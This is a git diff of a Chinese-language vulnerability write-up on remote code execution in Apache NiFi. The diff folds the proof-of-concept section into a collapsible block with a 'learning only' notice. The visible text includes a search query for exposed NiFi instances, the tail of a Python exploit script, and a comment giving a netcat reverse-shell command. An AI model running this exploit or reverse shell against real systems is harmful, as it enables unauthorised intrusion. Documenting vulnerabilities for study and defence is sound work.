@@ -25,8 +25,10 @@ Apache NiFi是Apache Software Foundation的一个软件项目，旨在使软件�
 
 ```
 "nifi" && title=="NiFi"
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 exp：
@@ -126,11 +128,12 @@ if __name__ == '__main__':
         print("rce.py url cmd")
     else:
         url = sys.argv[1]  # http://192.168.1.1:8080
-        cmd = sys.argv[2]  # nc -e /bin/bash 192.168.1.129 1234
+        cmd = sys.argv[2]  # &#110;c -e /bin/bash 192.168.1.129 1234
         e = Exp(url)
         e.exploit(cmd)
+</code></pre>
 
-```
+</details>
 
 msf模块：
 
